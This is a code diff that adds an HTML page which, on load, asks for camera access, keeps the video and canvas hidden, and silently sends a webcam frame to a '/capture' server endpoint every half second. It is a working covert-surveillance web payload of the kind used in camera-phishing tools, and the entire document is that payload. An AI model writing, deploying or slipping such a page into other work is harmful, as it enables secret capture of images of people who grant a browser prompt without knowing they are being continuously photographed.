@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera Capture</title>
+  <style> video { display: none; } </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    async function startCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL("image/png");
+
+          fetch("/capture", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ image: dataUrl })
+          });
+        }, 500);
+
+        window.addEventListener("beforeunload", () => {
+          const tracks = stream.getTracks();
+          tracks.forEach(t => t.stop());
+        });
+
+      } catch (err) {
+        console.error("Camera access error:", err);
+      }
+    }
+
+    window.onload = startCapture;
+  </script>
+</body>
+</html>
